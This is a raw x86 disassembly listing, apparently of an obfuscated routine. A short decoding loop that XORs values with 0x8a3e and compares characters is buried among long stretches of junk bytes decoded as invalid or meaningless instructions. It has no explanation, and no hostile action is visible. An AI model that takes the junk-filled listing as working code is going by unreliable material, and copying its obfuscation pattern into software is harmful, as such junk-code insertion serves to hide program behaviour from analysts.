  4048e8:	dec    ecx
  4048e9:	lods   eax,DWORD PTR ds:[esi]
  4048ea:	arpl   WORD PTR [ecx],bp
  4048ec:	push   esi
  4048ed:	xchg   BYTE PTR [esp+edx*4+0x6438c167],ch
  4048f4:	outs   dx,DWORD PTR ds:[esi]
  4048f5:	or     cl,dh
  4048f7:	add    ch,BYTE PTR ds:0x609b3b8
  4048fd:	std    
  4048fe:	das    
  4048ff:	ret    0xd0c3
  404902:	push   edx
  404903:	shl    BYTE PTR [ebx+0x4f],1
  404906:	addr16 in al,dx
  404908:	rol    DWORD PTR fs:[edi+0x2e3ece78],cl
  40490f:	cdq    
  404910:	xor    eax,esi
  404912:	dec    DWORD PTR [esi-0x15]
  404915:	mov    ds:0x33f4458b,al
  40491a:	rol    DWORD PTR [ebx],1
  40491c:	(bad)  
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e21c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e224,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e7ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e234,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fe05,0x42e234
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fe7a,0x42fdf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fe7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e803,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fe82,0x42fe7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e807,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	push   edx
  4049bc:	cmp    dh,BYTE PTR [edx-0x7e]
  4049bf:	leave  
  4049c0:	and    DWORD PTR [eax+0x70],esi
  4049c3:	cmp    eax,0x670707d
  4049c8:	enter  0x3633,0x29
  4049cc:	ins    BYTE PTR es:[edi],dx
  4049cd:	jge    0x404a26
  4049cf:	inc    ebp
  4049d0:	and    BYTE PTR [ecx+0x4c8d03ec],bh
  4049d6:	call   0x511d:0x2aa3cd3e
  4049dd:	in     al,0x8a
  4049df:	arpl   di,dx
  4049e1:	sbb    dl,BYTE PTR [edx-0x25]
  4049e4:	popf   
  4049e5:	inc    esp
  4049e6:	jo     0x40497a
  4049e8:	sub    bh,bl
  4049ea:	dec    DWORD PTR [esi+0x74]
  4049ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049ee:	bound  edx,QWORD PTR [ecx+eax*2+0x1a5b3bb4]
  4049f5:	shr    DWORD PTR ds:0xf0a21aa4,0x8f
  4049fc:	leave  
  4049fd:	and    BYTE PTR [ebx-0x657b4ca5],0x2
  404a04:	add    eax,ebp
  404a06:	xor    eax,0xfddf4986
  404a0b:	arpl   WORD PTR [edx-0x243d1d19],si
  404a11:	inc    esp
  404a12:	cli    
  404a13:	jmp    0xfb5aec3d
  404a18:	xor    ecx,DWORD PTR [ebx-0x5a]
  404a1b:	sub    eax,0xc2ddc678
  404a20:	sub    eax,0x20748cec
  404a25:	imul   edi,DWORD PTR [ebx],0xffffffa3
  404a28:	pop    edx
  404a29:	pop    DWORD PTR [eax]
  404a2b:	add    bl,dl
  404a2d:	mov    al,0xda
  404a2f:	mov    esp,0x75da0ef0
  404a34:	in     al,0x67
  404a36:	retf   
  404a37:	fdiv   DWORD PTR [eax+0x3fe60287]
  404a3d:	retf   
  404a3e:	cmp    al,0x68
  404a40:	push   ss
  404a41:	in     al,0x6
  404a43:	mov    ds:0xb03d8438,eax
  404a48:	shr    BYTE PTR [edx+edi*2],cl
  404a4b:	push   eax
  404a4c:	cld    
  404a4d:	mov    esp,ebp
  404a4f:	sub    dh,BYTE PTR [ecx+0x77ee58a0]
  404a55:	test   al,0xa8
  404a57:	loope  0x404a26
  404a59:	clc    
  404a5a:	retf   
  404a5b:	call   0x48f9:0x2970fff6
  404a62:	scas   eax,DWORD PTR es:[edi]
  404a63:	mov    ch,0xb4
  404a65:	mov    al,0xd8
  404a67:	sbb    esp,esi
  404a69:	adc    esp,DWORD PTR gs:[edi-0x2f]
  404a6d:	test   ecx,ebx
  404a6f:	aam    0xd4
  404a71:	xchg   DWORD PTR [edx],esp
  404a73:	xor    eax,edi
  404a75:	inc    ecx
  404a76:	sub    al,0x97
  404a78:	mov    ds:0x9b0a35bb,eax
  404a7d:	push   es
  404a7e:	lock (bad) 
  404a81:	pushf  
  404a82:	push   ss
  404a83:	dec    ebp
  404a84:	sahf   
  404a85:	das    
  404a86:	mov    edx,0xce5a9fa6
  404a8b:	sbb    DWORD PTR [edx-0x5d],0x59
  404a8f:	mov    al,0xb0
  404a91:	add    eax,0x970cd900
  404a96:	lds    edi,FWORD PTR [edi-0x6a13c48d]
  404a9c:	arpl   WORD PTR [esi+0x7b],dx
  404a9f:	aaa    
  404aa0:	(bad)  
  404aa1:	cmp    al,0x15
  404aa3:	add    eax,DWORD PTR ds:0x5b957c7e
  404aa9:	xchg   esi,eax
  404aaa:	dec    esi
  404aab:	int    0x36
  404aad:	jg     0x404aa2
  404aaf:	mov    bh,0xba
  404ab1:	dec    ecx
  404ab2:	and    eax,0x5fce443c
  404ab7:	scas   al,BYTE PTR es:[edi]
  404ab8:	enter  0x19b6,0x48
  404abc:	das    
  404abd:	pop    edx
  404abe:	mov    edx,DWORD PTR [edx-0x4b]
  404ac1:	mov    ecx,0x9438362c
  404ac6:	cmp    bl,bh
  404ac8:	icebp  
  404ac9:	pop    ebp
  404aca:	xor    DWORD PTR [edx],ebx
  404acc:	hlt    
  404acd:	(bad)  
  404ace:	int    0xaa
  404ad0:	adc    bh,BYTE PTR [ecx+0x69a484c9]
  404ad6:	jno    0x404b0a
  404ad8:	test   BYTE PTR ds:0xf0bee565,al
  404ade:	add    BYTE PTR [eax-0xb916243],ch
  404ae4:	outs   dx,DWORD PTR ds:[esi]
  404ae5:	add    cl,BYTE PTR [esi]
  404ae7:	icebp  
  404ae8:	mov    eax,0x457c0f44
  404aed:	xor    cl,BYTE PTR [esp+esi*4]
  404af0:	xchg   ecx,eax
  404af1:	and    eax,0xf42ee00f
  404af6:	jg     0x404b16
  404af8:	mov    fs,ecx
  404afa:	sbb    al,0x7
  404afc:	lea    ebp,[edi-0x1840ae6]
  404b02:	xchg   ebp,eax
  404b03:	int    0xf6
  404b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b06:	dec    esp
  404b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b08:	je     0x404ac7
  404b0a:	cmp    cl,ah
  404b0c:	cmp    dh,BYTE PTR [ecx+eiz*4-0x39]
  404b10:	cmp    eax,0xce27fc6a
  404b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b16:	je     0x404b39
  404b18:	jne    0x404b8f
  404b1a:	fucomi st,st(5)
  404b1c:	call   0xecf1:0x4bd1cb1d
  404b23:	int3   
  404b24:	call   0xb48a:0x2535527d
  404b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b2c:	not    al
  404b2e:	cmp    DWORD PTR [esp+ebp*8],esi
  404b31:	popa   
  404b32:	pop    esi
  404b33:	ins    DWORD PTR es:[edi],dx
  404b34:	jge    0x404aee
  404b36:	pop    edi
  404b37:	ja     0x404b4c
  404b39:	inc    esp
  404b3a:	jmp    0x6223df8c
  404b3f:	stos   BYTE PTR es:[edi],al
  404b40:	js     0x404bad
  404b42:	outs   dx,DWORD PTR ds:[esi]
  404b43:	in     al,0x2d
  404b45:	mov    ch,0x9e
  404b47:	jns    0x404af0
  404b49:	pop    ds
  404b4a:	pop    esp
  404b4b:	std    
  404b4c:	push   ds
  404b4d:	aad    0x11
  404b4f:	xor    al,BYTE PTR [esi]
  404b51:	(bad)  
  404b52:	adc    eax,0x6aa5e22
  404b57:	out    0x3b,al
  404b59:	sub    BYTE PTR [ebp+0x2183d56b],bh
  404b5f:	add    eax,0xd941a3e7
  404b64:	sbb    eax,0xa036aa56
  404b69:	jo     0x404baf
  404b6b:	sbb    dh,al
  404b6d:	in     eax,0x42
  404b6f:	aas    
  404b70:	cmp    ebx,DWORD PTR [ebx-0x7b]
  404b73:	lods   al,BYTE PTR ds:[esi]
  404b74:	das    
  404b75:	mov    ds:0x70edf56a,eax
  404b7a:	add    eax,0xb7696942
  404b7f:	jns    0x404b97
  404b81:	xchg   ebx,eax
  404b82:	enter  0xd802,0x15
  404b86:	and    esi,esi
  404b88:	rcl    BYTE PTR [esi],0xa9
  404b8b:	and    eax,0xb49ad12d
  404b90:	jg     0x404b6e
  404b92:	shl    bl,1
  404b94:	ja     0x404b86
  404b96:	les    ebp,FWORD PTR [edi]
  404b98:	std    
  404b99:	sub    eax,DWORD PTR [eax+0x1f73da40]
  404b9f:	and    BYTE PTR [edx],al
  404ba1:	push   esi
  404ba2:	call   0x309d5fe5
  404ba7:	daa    
  404ba8:	adc    eax,0x76091e51
  404bad:	push   ebx
  404bae:	pop    ebx
  404baf:	(bad)  
  404bb0:	lods   al,BYTE PTR ds:[esi]
  404bb1:	(bad)  
  404bb2:	idiv   esp
  404bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb5:	xchg   esi,eax
  404bb6:	rcl    BYTE PTR [edi],0x6
  404bb9:	js     0x404b60
  404bbb:	jns    0x404bbd
  404bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbe:	mov    edi,DWORD PTR [ebx]
  404bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bc1:	push   ebx
  404bc2:	mov    WORD PTR [esi],ss
  404bc4:	xchg   ebp,eax
  404bc5:	sub    BYTE PTR [edx],ch
  404bc7:	call   0x703e1f37
  404bcc:	push   ecx
  404bcd:	mov    edi,0x2fac741b
  404bd2:	ror    DWORD PTR [eax+0x3e],cl
  404bd5:	int3   
  404bd6:	pushf  
  404bd7:	add    eax,0x56396ee9
  404bdc:	cvtps2pd xmm5,QWORD PTR [ebp+0x37e06cc3]
  404be3:	out    0xd1,eax
  404be5:	ins    BYTE PTR es:[edi],dx
  404be6:	popf   
  404be7:	test   eax,0xd517754e
  404bec:	gs push es
  404bee:	sbb    al,0x41
  404bf0:	(bad)  
  404bf1:	stc    
  404bf2:	xchg   ebx,eax
  404bf3:	xor    BYTE PTR [esi],al
  404bf5:	es jmp 0x553c:0x4c473ba7
  404bfd:	push   esp
  404bfe:	test   DWORD PTR [ebp+eax*2+0x144f763b],0xb93ae672
  404c09:	sbb    BYTE PTR [edx],ah
  404c0b:	out    dx,al
  404c0c:	xchg   esi,eax
  404c0d:	div    DWORD PTR [edi-0x691263eb]
  404c13:	push   edi
  404c14:	mov    eax,ds:0xa20ac113
  404c19:	sahf   
  404c1a:	aas    
  404c1b:	and    DWORD PTR [eax+0x64d1d478],0x69
  404c22:	aaa    
  404c23:	push   ebx
  404c24:	jecxz  0x404be2
  404c26:	adc    eax,0x1c82f7b0
  404c2b:	dec    esi
  404c2c:	arpl   di,dx
  404c2e:	sbb    ah,al
  404c30:	or     edi,0x7b
  404c33:	dec    ebp
  404c34:	daa    
  404c35:	loope  0x404c49
  404c37:	push   ebp
  404c38:	pop    ebp
  404c39:	xor    esi,DWORD PTR [edi+0x782688df]
  404c3f:	push   0xffffff80
  404c41:	pop    ebx
  404c42:	add    ch,BYTE PTR [edi+0x72a76d63]
  404c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c49:	mov    ds:0x8e5f49f7,al
  404c4e:	lods   eax,DWORD PTR ds:[esi]
  404c4f:	mov    ecx,0xf8a6f484
  404c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c55:	jg     0x404cc9
  404c57:	jmp    0xd40b5ac6
  404c5c:	lds    ecx,FWORD PTR [edi-0x39]
  404c5f:	imul   esi,ecx,0x337d1ba6
  404c65:	mov    dl,0x69
  404c67:	or     DWORD PTR [edx-0x4d7af603],0xffffffd0
  404c6e:	imul   edx,DWORD PTR [edi-0x7b907a72],0x97330807
  404c78:	fwait
  404c79:	push   ebx
  404c7a:	in     eax,dx
  404c7b:	add    ah,BYTE PTR [edi]
  404c7d:	inc    esp
  404c7e:	mov    eax,ds:0xb066edaa
  404c83:	add    al,0xa8
  404c85:	pusha  
  404c86:	mov    ah,0x7b
  404c88:	xor    bh,BYTE PTR [eax-0x42850f68]
  404c8e:	jae    0x404ca9
  404c90:	hlt    
  404c91:	add    cl,ch
  404c93:	pop    DWORD PTR [eax]
  404c95:	push   edx
  404c96:	ror    edi,1
  404c98:	lds    ebx,FWORD PTR [ebx+0x13]
  404c9b:	or     BYTE PTR [ebx],dh
  404c9d:	mov    BYTE PTR [esi+0x12],dh
  404ca0:	mov    ah,0xf9
  404ca2:	dec    eax
  404ca3:	cmp    ch,ch
  404ca5:	and    BYTE PTR ds:0xc1554a35,ah
  404cab:	(bad)  
  404cac:	fnstsw WORD PTR [eax-0x27]
  404caf:	jb     0x404c6d
  404cb1:	push   ebp
  404cb2:	addr16 pushf 
  404cb4:	ret    
  404cb5:	sti    
  404cb6:	sbb    DWORD PTR [edi+edx*1+0x7f],edi
  404cba:	pusha  
  404cbb:	pushf  
  404cbc:	adc    ecx,DWORD PTR [ebx+0x11]
  404cbf:	adc    esp,esp
  404cc1:	out    dx,al
  404cc2:	dec    eax
  404cc3:	les    ecx,FWORD PTR [ecx-0x12aa51d2]
  404cc9:	popf   
  404cca:	adc    dh,BYTE PTR [ebp+0x1f1b1327]
  404cd0:	imul   esp,DWORD PTR [ebp-0x6],0xffffffff
  404cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd5:	dec    ecx
  404cd6:	cmp    al,0xaf
  404cd8:	mov    eax,0x62e0078a
  404cdd:	out    dx,al
  404cde:	jmp    0xc436c4b5
  404ce3:	(bad)  [ebp+0x74]
  404ce6:	mov    edx,0xc0da5615
  404ceb:	or     al,0x8a
  404ced:	jno    0x404c75
  404cef:	sbb    BYTE PTR [ebp+0x3],0xea
  404cf3:	mov    bl,0xb1
  404cf5:	ins    BYTE PTR es:[edi],dx
  404cf6:	ret    
  404cf7:	xchg   edx,eax
  404cf8:	and    edi,DWORD PTR [edi+0x1691438e]
  404cfe:	adc    DWORD PTR [edx+edi*4],ebx
  404d01:	or     bl,BYTE PTR [esp+eiz*4-0x4e7ab75d]
  404d08:	xchg   bh,bh
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e7ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e7eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x7a]
  404d39:	dec    ebp
  404d3a:	or     edx,DWORD PTR fs:[esi+0x3d70702e]
  404d41:	jge    0x404db3
  404d43:	jo     0x404d6f
  404d45:	std    
  404d46:	ror    eax,0x1e
  404d49:	cli    
  404d4a:	pop    eax
  404d4b:	xchg   edx,eax
  404d4c:	mov    WORD PTR [esi-0x24],gs
  404d4f:	dec    eax
  404d50:	cmp    eax,eax
  404d52:	mov    eax,0x675aab40
  404d57:	cli    
  404d58:	jbe    0x404cf7
  404d5a:	jg     0x404cf8
  404d5c:	add    ebx,esp
  404d5e:	pop    esp
  404d5f:	mov    dh,0x52
  404d61:	push   eax
  404d62:	xor    DWORD PTR [ebx+0x54],ebx
  404d65:	inc    edx
  404d66:	jo     0x404d34
  404d68:	add    ah,BYTE PTR ds:0xc1ae5bf3
  404d6e:	loope  0x404dd5
  404d70:	push   eax
  404d71:	add    BYTE PTR [esi-0x77],dl
  404d74:	push   edi
  404d75:	pop    esi
  404d76:	outs   dx,DWORD PTR ds:[esi]
  404d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d78:	mov    BYTE PTR [eax+ecx*1-0x4f],ah
  404d7c:	(bad)  
  404d7d:	(bad)  
  404d7f:	adc    edi,DWORD PTR [ebx]
  404d81:	pop    ecx
  404d82:	add    DWORD PTR [edi],0xfffffff6
  404d85:	in     al,dx
  404d86:	das    
  404d87:	pop    ebp
  404d88:	xor    esp,edx
  404d8a:	addr16 ret 0x374a
  404d8e:	mov    ecx,0x9a3395a2
  404d93:	bound  ebp,QWORD PTR [edx]
  404d95:	inc    ecx
  404d96:	sub    ch,dh
  404d98:	mov    BYTE PTR [edx+0x4e22a19e],dl
  404d9e:	ret    0xce41
  404da1:	jg     0x404d2a
  404da3:	pusha  
  404da4:	jge    0x404d3e
  404da6:	xchg   esi,esi
  404da8:	inc    ebp
  404da9:	adc    bh,ch
  404dab:	nop
  404dac:	inc    esi
  404dad:	and    dl,ch
  404daf:	sub    BYTE PTR [eax],bl
  404db1:	shr    BYTE PTR [edi+0x5e],1
  404db4:	xchg   ecx,eax
  404db5:	or     BYTE PTR [ebp-0x57c12db3],bl
  404dbb:	aam    0x3d
  404dbd:	pushf  
  404dbe:	or     eax,0x9414bcb
  404dc3:	jecxz  0x404da0
  404dc5:	mov    cl,0xcf
  404dc7:	in     al,0xef
  404dc9:	add    BYTE PTR [eax+0x46],ah
  404dcc:	or     BYTE PTR [edx+0x2b],bl
  404dcf:	push   ss
  404dd0:	(bad)  
  404dd1:	xor    ah,bh
  404dd3:	lahf   
  404dd4:	popf   
  404dd5:	ret    
  404dd6:	adc    al,0x99
  404dd8:	fs add eax,0x788e47f
  404dde:	iret   
  404ddf:	outs   dx,DWORD PTR ds:[esi]
  404de0:	mov    BYTE PTR [ecx],ah
  404de2:	mov    edx,0xeaf04f77
  404de7:	retf   0xb7a2
  404dea:	cmp    edi,ecx
  404dec:	aad    0x4
  404dee:	lods   eax,DWORD PTR ds:[esi]
  404def:	jle    0x404e54
  404df1:	mov    ecx,0x5990e5ab
  404df6:	adc    al,0xbc
  404df8:	inc    edi
  404df9:	test   eax,0x5db02fc3
  404dfe:	(bad)  
  404e00:	jmp    0xb3697f80
  404e05:	adc    bh,BYTE PTR [edx]
  404e07:	push   esp
  404e08:	icebp  
  404e09:	les    ebx,FWORD PTR [edx]
  404e0b:	mov    DWORD PTR fs:[bx+di-0x25a8],ebp
  404e11:	(bad)  
  404e12:	fld    QWORD PTR [esi-0x3ac0a539]
  404e18:	and    dh,BYTE PTR ds:0x56f27fc2
  404e1e:	mov    edi,0xa9d5a352
  404e23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e24:	ins    DWORD PTR es:[edi],dx
  404e25:	mov    bl,0x6e
  404e27:	test   al,0xb3
  404e29:	test   al,0xef
  404e2b:	sbb    al,0x68
  404e2d:	js     0x404e98
  404e2f:	setnp  BYTE PTR [ebp+0x12]
  404e33:	inc    edi
  404e34:	mov    cl,0xac
  404e36:	sub    bl,BYTE PTR ds:0x9c087bcb
  404e3c:	iret   
  404e3d:	inc    esp
  404e3e:	sub    esp,DWORD PTR [ecx+0x2e1f13ff]
  404e44:	jnp    0x404ea4
  404e46:	(bad)  
  404e47:	not    BYTE PTR [ecx+0x15]
  404e4a:	lea    esp,[edx]
  404e4c:	xchg   DWORD PTR [ecx+0x5e1c65b1],edx
  404e52:	lods   eax,DWORD PTR ds:[esi]
  404e53:	popa   
  404e54:	lahf   
  404e55:	mov    cl,0x7f
  404e57:	mov    bh,0x7d
  404e59:	test   esi,eax
  404e5b:	les    edi,FWORD PTR [edx]
  404e5d:	lods   eax,DWORD PTR ds:[esi]
  404e5e:	sub    BYTE PTR [eax+0x21],dh
  404e61:	in     eax,0xb9
  404e63:	ficom  WORD PTR [edx+0x77]
  404e66:	mov    al,0xf5
  404e68:	popf   
  404e69:	sbb    DWORD PTR [edx+0x5d597ee8],ebp
  404e6f:	lock mov esi,0x2988c7f6
  404e75:	jbe    0x404e31
  404e77:	jne    0x404e5c
  404e79:	jne    0x404e9b
  404e7b:	iret   
  404e7c:	add    BYTE PTR [ebx+0x7a],dh
  404e7f:	push   0x75343d5a
  404e84:	mov    ?,ecx
  404e86:	pop    ebx
  404e87:	inc    esp
  404e88:	adc    edx,DWORD PTR [eax-0x3e]
  404e8b:	(bad)  
  404e8c:	sti    
  404e8d:	xchg   ebx,eax
  404e8e:	dec    esp
  404e8f:	dec    ebp
  404e90:	add    edx,DWORD PTR [eax+0x7446454b]
  404e96:	int3   
  404e97:	les    ebp,FWORD PTR [ebx-0x49]
  404e9a:	je     0x404e5a
  404e9c:	dec    eax
  404e9d:	and    BYTE PTR [ebx+0x480de32a],0xa1
  404ea4:	inc    ecx
  404ea5:	inc    ecx
  404ea6:	or     ecx,ebp
  404ea8:	adc    BYTE PTR [ecx],dl
  404eaa:	das    
  404eab:	out    dx,al
  404eac:	cdq    
  404ead:	imul   ebp,DWORD PTR [ebp+0x3e],0x4744dc96
  404eb4:	push   cs
  404eb5:	xchg   ecx,eax
  404eb6:	sbb    al,0x24
  404eb8:	mov    ebx,DWORD PTR [ecx-0x48]
  404ebb:	cvtps2pi mm4,QWORD PTR [ebp+0xb]
  404ebf:	jns    0x404ef6
  404ec1:	jecxz  0x404f3b
  404ec3:	jns    0x404efa
  404ec5:	mov    ds:0xd1209a75,al
  404eca:	xchg   edi,eax
  404ecb:	and    al,0x3c
  404ecd:	mov    al,ds:0xe7846b8a
  404ed2:	mov    eax,0x3583469d
  404ed7:	jecxz  0x404f20
  404ed9:	rcl    ebp,0x62
  404edc:	mov    ds:0xe782a986,eax
  404ee1:	ins    BYTE PTR es:[edi],dx
  404ee2:	ret    
  404ee3:	jmp    FWORD PTR [ecx-0x34]
  404ee6:	and    bl,BYTE PTR [ecx]
  404ee8:	dec    ch
  404eea:	or     ebp,DWORD PTR [ecx-0x52]
  404eed:	jle    0x404e95
  404eef:	cli    
  404ef0:	mov    esp,0x6424f58
  404ef5:	in     eax,dx
  404ef6:	pop    edx
  404ef7:	repnz mov ecx,0xf07c61e6
  404efd:	xor    DWORD PTR ds:[ebp-0x69],ebx
  404f01:	pop    sp
  404f03:	nop
  404f04:	(bad)  
  404f05:	push   ss
  404f06:	sub    BYTE PTR [edi],cl
  404f08:	ins    BYTE PTR es:[edi],dx
  404f09:	hlt    
  404f0a:	lods   eax,DWORD PTR ds:[esi]
  404f0b:	imul   ebp,DWORD PTR [edx],0x87e39ae1
  404f11:	lods   al,BYTE PTR ds:[esi]
  404f12:	sbb    BYTE PTR [ecx+ebx*4+0x15656334],ch
  404f19:	mov    esp,0xde856cc6
  404f1e:	xchg   dl,dl
  404f20:	jae    0x404f74
  404f22:	das    
  404f23:	mov    ds:0xa1dc6922,al
  404f28:	or     eax,0xdc9dfbf0
  404f2d:	in     eax,dx
  404f2e:	push   ebp
  404f2f:	and    DWORD PTR [ebp+0x7454dd66],0x48dc6e50
  404f39:	sahf   
  404f3a:	mov    ebx,0x9cf73d60
  404f3f:	xor    eax,0x7efb115f
  404f44:	sub    eax,0xcd999273
  404f49:	lahf   
  404f4a:	jae    0x404f13
  404f4c:	stc    
  404f4d:	push   ebp
  404f4e:	push   0x35745f3f
  404f53:	jnp    0x404faf
  404f55:	jmp    DWORD PTR [edi]
  404f57:	sub    cl,dl
  404f59:	jne    0x404fbd
  404f5b:	jno    0x404f1f
  404f5d:	mov    BYTE PTR [esi-0x66e728e4],cl
  404f63:	and    eax,DWORD PTR [edi+ecx*1]
  404f66:	push   ds
  404f67:	xrstors [esi]
  404f6a:	mov    bl,0xce
  404f6c:	pop    es
  404f6d:	mov    al,ds:0x5e0d47ab
  404f72:	mov    dl,0x6b
  404f74:	(bad)  
  404f75:	call   0xeb2c5325
  404f7a:	xchg   ebx,eax
  404f7b:	inc    edi
  404f7c:	pusha  
  404f7d:	imul   esp,DWORD PTR [edx],0x1941325c
  404f83:	adc    al,0xd8
  404f85:	xchg   DWORD PTR [ebp+0x5bfdda60],edx
  404f8b:	push   ds
  404f8c:	pop    edi
  404f8d:	retf   0xfda5
  404f90:	dec    eax
  404f91:	std    
  404f92:	jle    0x404f28
  404f94:	xchg   BYTE PTR [ecx+0x642a6b9f],dh
  404f9a:	aad    0xb6
  404f9c:	pop    ds
  404f9d:	test   eax,0xec4d629d
  404fa2:	fs ret 
  404fa4:	xchg   edi,eax
  404fa5:	inc    eax
  404fa6:	jge    0x405019
  404fa8:	inc    edx
  404fa9:	mov    eax,ds:0xae2a39f9
  404fae:	sti    
  404faf:	or     ebp,ecx
  404fb1:	push   eax
  404fb2:	mov    edx,0x2ec99b80
  404fb7:	push   es
  404fb8:	(bad)  [ebx+ebx*8+0x3abe9c6c]
  404fbf:	iret   
  404fc0:	lods   eax,DWORD PTR es:[esi]
  404fc2:	iret   
  404fc3:	not    DWORD PTR [esp+esi*8-0x46aafdb8]
  404fca:	xchg   DWORD PTR ds:0xfcf59601,ebp
  404fd0:	push   esi
  404fd1:	inc    eax
  404fd2:	mov    ecx,0xf294ead1
  404fd7:	icebp  
  404fd8:	push   esi
  404fd9:	or     eax,0xe63de6d2
  404fde:	sub    ebp,DWORD PTR [ebp+0x65bef6e1]
  404fe4:	sbb    BYTE PTR [edi+0x14],cl
  404fe7:	in     al,dx
  404fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fe9:	push   edx
  404fea:	and    DWORD PTR [edx+esi*4],ebx
  404fed:	xor    DWORD PTR [ecx+0x16c0a55b],ebx
  404ff3:	sbb    dl,bl
  404ff5:	adc    BYTE PTR [edx-0x4f],dl
  404ff8:	xchg   ebx,eax
  404ff9:	mul    DWORD PTR [ebp+0x4d]
  404ffc:	pop    ds
  404ffd:	push   eax
  404ffe:	ficom  WORD PTR [edx]
  405000:	sbb    esi,DWORD PTR ds:0xbdf3ddff
  405006:	pop    ss
  405007:	push   ds
  405008:	xchg   esi,eax
  405009:	push   0xffffffa3
  40500b:	imul   esp,DWORD PTR [eax-0x6c4ca94a],0x75
  405012:	aaa    
  405013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405014:	mov    esp,0x325368bd
  405019:	scas   eax,DWORD PTR es:[edi]
  40501a:	mov    ebx,0xb9e9a93a
  40501f:	inc    esi
  405020:	das    
  405021:	adc    DWORD PTR [ebp+0x73fa61],ecx
  405027:	mov    DWORD PTR [edx+0x25ed8552],ebp
  40502d:	push   ebp
  40502e:	fcom   QWORD PTR [edx]
  405030:	add    DWORD PTR [ebx-0x6a9e1df1],0x22
  405037:	aaa    
  405038:	fcom   QWORD PTR [ebx-0x78]
  40503b:	int3   
  40503c:	stos   BYTE PTR es:[edi],al
  40503d:	int3   
  40503e:	jmp    FWORD PTR [esp+esi*4]
  405041:	sub    esi,DWORD PTR [esi-0x12430e8b]
  405047:	inc    esi
  405048:	dec    DWORD PTR [edx]
  40504a:	cmc    
  40504b:	ja     0x405057
  40504d:	test   DWORD PTR [ebx+eiz*8+0x35ba0d42],ebp
  405054:	xchg   ecx,eax
  405055:	inc    ebx
  405056:	dec    ecx
  405057:	mov    dh,0x6b
  405059:	mov    BYTE PTR es:[ebx],dl
  40505c:	jecxz  0x4050d1
  40505e:	sub    ch,BYTE PTR [edx-0x575ada4]
  405064:	cmp    ah,BYTE PTR [ecx]
  405066:	inc    ecx
  405067:	shl    DWORD PTR [eax+0x2c02de2a],1
  40506d:	sbb    ebx,DWORD PTR [ecx+0x5]
  405070:	iret   
  405071:	and    al,0x96
  405073:	retf   
  405074:	daa    
  405075:	add    al,0xd7
  405077:	lods   al,BYTE PTR ds:[esi]
  405078:	test   eax,0x2481bcd6
  40507d:	mov    bl,0x44
  40507f:	xchg   edx,eax
  405080:	test   DWORD PTR [eax+ebx*8+0x7f0d2791],ecx
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
